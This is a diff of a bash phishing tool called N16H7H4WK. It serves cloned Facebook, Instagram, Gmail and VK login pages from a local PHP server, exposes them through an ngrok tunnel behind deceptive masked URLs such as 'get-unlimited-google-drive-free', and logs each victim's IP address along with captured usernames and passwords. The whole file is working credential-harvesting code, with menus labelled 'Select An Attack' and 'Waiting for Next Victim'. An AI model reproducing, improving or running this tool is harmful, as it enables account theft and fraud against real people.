@@ -1,19 +1,12 @@
 #!/bin/bash
 
-##   N16H7H4WK 	: 	Phising Tool
-##   Author 	: 	NIGHT-HAWK 
-##   Github 	: 	https://github.com/Nighthawk-N16H7H4WK
-
-
-
-
-RED="$(printf '\033[31m')"          GREEN="$(printf '\033[32m')"    ORANGE="$(printf '\033[33m')"    BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"      CYAN="$(printf '\033[36m')"     WHITE="$(printf '\033[37m')"     BLACK="$(printf '\033[30m')"
-REDBG="$(printf '\033[41m')"        GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"    CYANBG="$(printf '\033[46m')"   WHITEBG="$(printf '\033[47m')"   BLACKBG="$(printf '\033[40m')"
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
 
-
+## Directories
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
@@ -24,9 +17,9 @@ else
 	mkdir -p ".server/www"
 fi
 
-
+## Script termination
 exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
     exit 0
 }
 
@@ -38,14 +31,14 @@ exit_on_signal_SIGTERM() {
 trap exit_on_signal_SIGINT SIGINT
 trap exit_on_signal_SIGTERM SIGTERM
 
-
+## Reset terminal colors
 reset_color() {
-	tput sgr0   
-	tput op    
+	tput sgr0   # reset attributes
+	tput op     # reset color
     return
 }
 
-
+## Kill already running process
 kill_pid() {
 	if [[ `pidof php` ]]; then
 		killall php > /dev/null 2>&1
@@ -58,42 +51,52 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-        ${BLUE}    ▒█▄░▒█ ▄█░ ▄▀▀▄ ▒█░▒█ ▀▀▀█ ▒█░▒█ ░█▀█░ ▒█░░▒█ ▒█░▄▀ 
-        ${BLUE}    ▒█▒█▒█ ░█░ █▄▄░ ▒█▀▀█ ░░█░ ▒█▀▀█ █▄▄█▄ ▒█▒█▒█ ▒█▀▄░ 
-        ${BLUE}    ▒█░░▀█ ▄█▄ ▀▄▄▀ ▒█░▒█ ░▐▌░ ▒█░▒█ ░░░█░ ▒█▄▀▄█ ▒█░▒█
-		${RED}[${RED}-${RED}]${RED} Made with love by NIGHTHAWK (N16H7H4WK)${RED}	
+		${ORANGE}
+  ${RED}      _   _ __   __  _    _ ______ _    _ _  ___          ___  __
+     ${ORANGE}  | \ | /_ | / / | |  | |____  | |  | | || \ \        / / |/ /
+   ${BLUE}    |  \| || |/ /_ | |__| |   / /| |__| | || |\ \  /\  / /| ' / 
+   ${BLUE}    |     || |  _ \|  __  |  / / |  __  |__   _\ \/  \/ / |  <  
+    ${GREEN}   | |\  || | (_) | |  | | / /  | |  | |  | |  \  /\  /  | . \ 
+    ${GREEN}   |_| \_||_|\___/|_|  |_|/_/   |_|  |_|  |_|   \/  \/   |_|\_\
+                                                                         
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Nighthawk ${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-        ${BLUE}    ▒█▄░▒█ ▄█░ ▄▀▀▄ ▒█░▒█ ▀▀▀█ ▒█░▒█ ░█▀█░ ▒█░░▒█ ▒█░▄▀ 
-        ${BLUE}    ▒█▒█▒█ ░█░ █▄▄░ ▒█▀▀█ ░░█░ ▒█▀▀█ █▄▄█▄ ▒█▒█▒█ ▒█▀▄░ 
-        ${BLUE}    ▒█░░▀█ ▄█▄ ▀▄▄▀ ▒█░▒█ ░▐▌░ ▒█░▒█ ░░░█░ ▒█▄▀▄█ ▒█░▒█	
+		${ORANGE}
+  ${RED}      _   _ __   __  _    _ ______ _    _ _  ___          ___  __
+     ${ORANGE}  | \ | /_ | / / | |  | |____  | |  | | || \ \        / / |/ /
+   ${BLUE}    |  \| || |/ /_ | |__| |   / /| |__| | || |\ \  /\  / /| ' / 
+   ${BLUE}    |     || |  _ \|  __  |  / / |  __  |__   _\ \/  \/ / |  <  
+    ${GREEN}   | |\  || | (_) | |  | | / /  | |  | |  | |  \  /\  /  | . \ 
+    ${GREEN}   |_| \_||_|\___/|_|  |_|/_/   |_|  |_|  |_|   \/  \/   |_|\_\
+                                                                         
 	EOF
 }
 
 ## Dependencies
 dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing....."
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN}"
 
     if [[ -d "/data/data/com.termux/files/home" ]]; then
         if [[ `command -v proot` ]]; then
             printf ''
         else
-			echo -e
+			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing... : ${ORANGE}proot${CYAN}"${WHITE}
             pkg install proot resolv-conf -y
         fi
     fi
 
 	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
-		echo -e 
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
 		pkgs=(php curl wget unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
-				echo -e 
+				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ `command -v pkg` ]]; then
 					pkg install "$pkg"
 				elif [[ `command -v apt` ]]; then
@@ -105,7 +108,7 @@ dependencies() {
 				elif [[ `command -v dnf` ]]; then
 					sudo dnf -y install "$pkg"
 				else
-					echo -e 
+					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -114,7 +117,7 @@ dependencies() {
 
 }
 
-
+## Download Ngrok
 download_ngrok() {
 	url="$1"
 	file=`basename $url`
@@ -128,7 +131,7 @@ download_ngrok() {
 		rm -rf "$file" > /dev/null 2>&1
 		chmod +x .server/ngrok > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured when installing ngrok server...."
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Try Again."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -136,9 +139,9 @@ download_ngrok() {
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
-		echo -e 
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN}"
 	else
-		echo -e 
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
@@ -156,7 +159,7 @@ install_ngrok() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you brother for using this tool.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -164,17 +167,19 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}Author   ${RED}:  ${ORANGE}NIGHTHAWK ${RED}[ ${ORANGE}N16H7H4WK ${RED}]
-		${RED}Github   ${RED}:  ${RED}https://github.com/Nighthawk-N16H7H4WK
-		${GREEN}[${GREEN}0${GREEN}]${GREEN} Main Menu     ${GREEN}[${GREEN}9${GREEN}]${RED} Exit
+		${GREEN}Author   ${RED}:  ${ORANGE}Tanvir Ahamed${RED}[ ${ORANGE}Nighthawk ${RED}]
+
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Nighthawk-N16H7H4WK
+
+		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${BLUE} Select : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	if [[ "$REPLY" == 9 ]]; then
+	if [[ "$REPLY" == 99 ]]; then
 		msg_exit
-	elif [[ "$REPLY" == 0 || "$REPLY" == 0 ]]; then
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Returning ..."
+	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
 		{ sleep 1; main_menu; }
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error, Try Again..."
@@ -187,46 +192,46 @@ HOST='127.0.0.1'
 PORT='8080'
 
 setup_site() {
-	echo -e ${WHITE}
+	echo -e 
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne ${WHITE}
+	echo -ne 
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
-## Get IP address
+
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${RED} Saved in : ${BLUE}ip.txt"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
 
-## Get credentials
+
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Saved in : ${ORANGE}usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Inf.... ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Victim, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
-## Print data
+
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting  Info..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + z ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Got a new victim !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Got a new login info !!"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -236,7 +241,7 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Setting... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Getting link..."
 
@@ -249,40 +254,41 @@ start_ngrok() {
 	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${BLUE}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${BLUE}$mask@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${RED}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
 
 
 
-## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
-		${RED}[${WHITE}01${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
+
+		${RED}[${WHITE}01${RED}]${ORANGE} Ngrok
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select  : ${BLUE}"
+
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		start_ngrok
 	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error, Try Again..."
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; tunnel_menu; }
 	fi
 }
 
-
+## Facebook
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Login Page
 
-		${RED}[${WHITE}02${RED}]${ORANGE} Voting Poll Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Voting Poll
 
-		${RED}[${WHITE}03${RED}]${ORANGE} Messenger Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Messenger Page
 
 	EOF
 
@@ -306,19 +312,19 @@ site_facebook() {
 	fi
 }
 
-
+## Instagram
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Login Page
 
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers
 
-		${RED}[${WHITE}03${RED}]${ORANGE} Blue Badge Verify Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Blue Badge Verify
 
 	EOF
 
-	read -p "\n${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		website="instagram"
@@ -338,24 +344,29 @@ site_instagram() {
 	fi
 }
 
-
+## Gmail/Google
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Login Page
+		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old
 
-		${RED}[${WHITE}02${RED}]${ORANGE} Voting Poll
-    
+		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New
+
+		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-
-	if [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="google_new"
+	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
+		website="google"
 		mask='http://get-unlimited-google-drive-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
+		website="google_new"
+		mask='http://get-unlimited-google-drive-free'
+		tunnel_menu
+	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		website="google_poll"
 		mask='http://vote-for-the-best-social-media'
 		tunnel_menu
@@ -365,24 +376,46 @@ site_gmail() {
 	fi
 }
 
+## Vk
+site_vk() {
+	cat <<- EOF
 
+		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 
+		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
+		website="vk"
+		mask='http://vk-premium-real-method-2020'
+		tunnel_menu
+	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
+		website="vk_poll"
+		mask='http://vote-for-the-best-social-media'
+		tunnel_menu
+	else
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Terminated, Try Again..."
+		{ sleep 1; clear; banner_small; site_vk; }
+	fi
+}
+
+## Menu
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${RED} Select An Attack ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook     ${RED}[${WHITE}02${RED}]${ORANGE} Instagram  
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook    ${RED}[${WHITE}02${RED}]${ORANGE} Instagram 
 
-${RED}[${WHITE}03${RED}]${ORANGE} Google   
+${RED}[${WHITE}03${RED}]${ORANGE} Google   		
 
-		${RED}[${WHITE}9${RED}]${ORANGE} About         ${RED}[${WHITE}0${RED}]${RED} Exit
-
+		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 	EOF
 	
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select: ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		site_facebook
@@ -390,7 +423,6 @@ ${RED}[${WHITE}03${RED}]${ORANGE} Google
 		site_instagram
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		site_gmail
-	
 	elif [[ "$REPLY" == 99 ]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
